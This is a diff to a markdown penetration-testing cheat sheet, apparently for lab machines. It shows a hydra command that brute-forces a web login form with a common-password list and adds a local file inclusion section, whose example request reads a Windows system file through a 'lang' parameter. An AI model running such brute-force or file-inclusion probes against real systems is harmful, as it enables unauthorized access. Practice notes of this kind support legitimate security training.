@@ -30,3 +30,11 @@ nikto -h IP_ADDR
 //Bruteforce login form (Invalid is the error message return when a wrong password is provided"
 hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64 
 ```
+
+### LOCAL FILE INCLUSION
+
+when there is something like ```http://10.10.10.151/blog/?lang=blog-en.php```
+if the host is Windows we can try to access this file in order to validate our findings:
+```
+10.10.10.151/blog/?lang=/windows/system32/license.rtf
+```
